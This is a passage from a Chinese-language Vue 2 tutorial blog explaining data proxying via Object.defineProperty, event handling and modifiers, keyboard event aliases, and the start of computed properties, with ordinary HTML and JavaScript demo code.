class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    </span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> data1 = &#123;</span><br><span class="language-javascript">         <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;家里蹲大学&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">address</span>: <span class="hljs-string">&#x27;China&#x27;</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    </span><br><span class="language-javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-comment">// 我们在Vue 初始化的配置项中写了 data 属性。</span></span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: data1</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124110704095.png" alt="image-20221124110704095"></p><blockquote><p>打印结果为true，说明两者就是同一个</p></blockquote><p>好了，再回到数据代理上来，将 <strong>vm._data</strong> 中的值，再代理到 vm 本身上来，用vm.name 代替 <strong>vm._data.name</strong>。这就是 Vue 的数据代理</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124110841601.png" alt="image-20221124110841601"></p><p>这一切都是通过 Object.defineProperty() 来完成的，我来模拟一下这个过程</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html">Object.defineProperty(vm, &#x27;name&#x27;, &#123;<br>    get() &#123;<br>        return vm._data.name;<br>    &#125;,<br>    set(value) &#123;<br>        vm._data.name = value<br>    &#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure><blockquote><p>这样有啥意义？明明通过 vm._data.name 也可以访问 name 的值，为啥费力去这样操作？</p></blockquote><p>在插值语法中，<code>&#123;&#123; name &#125;&#125;</code> 取到的值就相当于 <code>&#123;&#123; vm.name &#125;&#125;</code>，不用数据代理的话，在插值语法就要这样去写了。</p><p><code>&#123;&#123; _data. name &#125;&#125;</code> 这不符合直觉，怪怪的。vue 这样设计更利于开发者开发，我们在研究原理会觉得有些复杂（笑~）</p><p>来个尚硅谷张天禹老师做的图（非常推荐去看他的课，讲的非常好）</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/8ccad88c5e40497587dadb3db07e1821.png" alt="在这里插入图片描述"></p><h2 id="1-7-事件处理"><a href="#1-7-事件处理" class="headerlink" title="1.7 事件处理"></a>1.7 事件处理</h2><p>事件的基本使用：</p><ol><li>使用v-on:xxx或@xxx绑定事件，其中 xxx 是事件名</li><li>事件的回调需要配置在methods对象中，最终会在vm上</li><li>methods中配置的函数，不要用箭头函数，否则 this 就不是vm了</li><li>methods中配置的函数，都是被 Vue所管理的函数，this 的指向是vm或组件实例对象</li><li>@click&#x3D;”demo”和@click&#x3D;”demo($event)”效果一致，但后者可以传参</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>事件的基本使用<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 引入Vue --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- &lt;button v-on:click=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt; --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo1&quot;</span>&gt;</span>点我提示信息1（不传参）<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo2($event,66)&quot;</span>&gt;</span>点我提示信息2（传参）<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">//阻止 vue 在启动时生成生产提示。</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;cess&#x27;</span>,</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-title function_">showInfo1</span>(<span class="hljs-params">event</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">target</span>.<span class="hljs-property">innerText</span>)</span><br><span class="language-javascript">            <span class="hljs-comment">// console.log(this) // 此处的this是vm</span></span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;同学你好！&#x27;</span>)</span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-title function_">showInfo2</span>(<span class="hljs-params">event, number</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event, number)</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">target</span>.<span class="hljs-property">innerText</span>)</span><br><span class="language-javascript">            <span class="hljs-comment">// console.log(this) // 此处的this是vm</span></span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;同学你好！！&#x27;</span>)</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Vue中的事件修饰符</strong></p><ul><li>&#x3D;&#x3D;prevent&#x3D;&#x3D;阻止默认事件（常用）</li><li>&#x3D;&#x3D;stop&#x3D;&#x3D;阻止事件冒泡（常用）</li><li>&#x3D;&#x3D;once&#x3D;&#x3D;事件只触发一次（常用）</li><li><strong>capture</strong>使用事件的捕获模式</li><li><strong>self</strong>只有event.target是当前操作的元素时才触发事件</li><li><strong>passive</strong>事件的默认行为立即执行，无需等待事件回调执行完毕</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>事件修饰符<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 引入Vue --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">      * &#123;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;&#125;</span><br><span class="language-css">      <span class="hljs-selector-class">.demo1</span> &#123;<span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;<span class="hljs-attribute">background-color</span>: skyblue;&#125;</span><br><span class="language-css">      <span class="hljs-selector-class">.box1</span> &#123;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;<span class="hljs-attribute">background-color</span>: skyblue;&#125;</span><br><span class="language-css">      <span class="hljs-selector-class">.box2</span> &#123;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;<span class="hljs-attribute">background-color</span>: white;&#125;</span><br><span class="language-css">      <span class="hljs-selector-class">.list</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;<span class="hljs-attribute">background-color</span>: skyblue;<span class="hljs-attribute">overflow</span>: auto;&#125;</span><br><span class="language-css">      <span class="hljs-selector-tag">li</span> &#123;<span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;&#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>欢迎来到&#123;&#123; name &#125;&#125;学习<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- 阻止默认事件（常用） --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.atguigu.com&quot;</span> @<span class="hljs-attr">click.prevent</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br>      <span class="hljs-comment">&lt;!-- 阻止事件冒泡（常用） --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo1&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click.stop</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 修饰符可以连续写 --&gt;</span><br>        <span class="hljs-comment">&lt;!-- &lt;a href=&quot;http://www.qq.com&quot; @click.prevent.stop=&quot;showInfo&quot;&gt;点我提示&lt;/a&gt; --&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>      <span class="hljs-comment">&lt;!-- 事件只触发一次（常用） --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click.once</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>      <span class="hljs-comment">&lt;!-- 使用事件的捕获模式 --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box1&quot;</span> @<span class="hljs-attr">click.capture</span>=<span class="hljs-string">&quot;showMsg(1)&quot;</span>&gt;</span><br>        div1<br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box2&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showMsg(2)&quot;</span>&gt;</span><br>          div2<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>      <span class="hljs-comment">&lt;!-- 只有event.target是当前操作的元素时才触发事件； --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo1&quot;</span> @<span class="hljs-attr">click.self</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>      <span class="hljs-comment">&lt;!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； --&gt;</span><br>      <span class="hljs-comment">&lt;!-- scroll是滚动条滚动，passsive没有影响 --&gt;</span><br>      <span class="hljs-comment">&lt;!-- wheel是鼠标滚轮滚动，passive有影响 --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> @<span class="hljs-attr">wheel.passive</span>=<span class="hljs-string">&quot;demo&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;list&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;尚硅谷&#x27;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-title function_">showInfo</span>(<span class="hljs-params">e</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;同学你好！&#x27;</span>)</span><br><span class="language-javascript">            <span class="hljs-comment">// console.log(e.target)</span></span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-title function_">showMsg</span>(<span class="hljs-params">msg</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(msg)</span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-title function_">demo</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000</span>; i++) &#123;</span><br><span class="language-javascript">              <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;#&#x27;</span>)</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;累坏了&#x27;</span>)</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-8-键盘事件"><a href="#1-8-键盘事件" class="headerlink" title="1.8 键盘事件"></a>1.8 键盘事件</h2><p>键盘事件语法糖：<code>@keydown</code>，<code>@keyup</code></p><ol><li>Vue中常用的按键别名<br>回车 enter<br>删除delete捕获“删除”和“退格”键<br>退出 esc<br>空格 space<br>换行 tab 特殊，必须配合<strong>keydown</strong>去使用<br>上 up<br>下 down<br>左 left<br>右 right</li><li>Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（多单词小写短横线写法）</li><li>系统修饰键（用法特殊）ctrl alt shift meta（meta就是win键）<ul><li>配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发<br>指定 ctrl+y 使用 @keyup.ctr.y</li><li>配合keydown使用：正常触发事件</li></ul></li><li>也可以使用keyCode去指定具体的按键（不推荐）</li><li>Vue.config.keyCodes.自定义键名 &#x3D; 键码，可以去定制按键别名</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>键盘事件<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 引入Vue --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;按下回车提示输入&quot;</span> @<span class="hljs-attr">keyup.enter</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;按下ctrl+随意提示输入&quot;</span> @<span class="hljs-attr">keyup.ctrl</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;按下ctrl+y提示输入&quot;</span> @<span class="hljs-attr">keyup.ctrl.y</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;按下tab提示输入&quot;</span> @<span class="hljs-attr">keydown.tab</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;按下回车提示输入&quot;</span> @<span class="hljs-attr">keydown.huiche</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//   Vue.config.productionTip = false// 阻止 vue 在启动时生成生产提示。</span></span><br><span class="language-javascript">      <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">keyCodes</span>.<span class="hljs-property">huiche</span> = <span class="hljs-number">13</span><span class="hljs-comment">// 定义了一个别名按键</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;cess&#x27;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-title function_">showInfo</span>(<span class="hljs-params">e</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-comment">// console.log(e.key,e.keyCode)</span></span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>)</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">      &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-9-计算属性"><a href="#1-9-计算属性" class="headerlink" title="1.9 计算属性"></a>1.9 计算属性</h2><ul><li>定义：要用的属性不存在，要通过已有属性计算得来</li><li>原理：底层借助了Objcet.defineProperty方法提供的getter和setter</li><li>get函数什么时候执行？<ul><li>(1).初次读取时会执行一次</li><li>(2).当依赖的数据发生改变时会被再次调用</li></ul></li><li>优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便</li><li>备注：<ul><li>计算属性最终会出现在vm上，直接读取使用即可</li><li>如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变</li></ul></li></ul><blockquote><p>计算属性</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 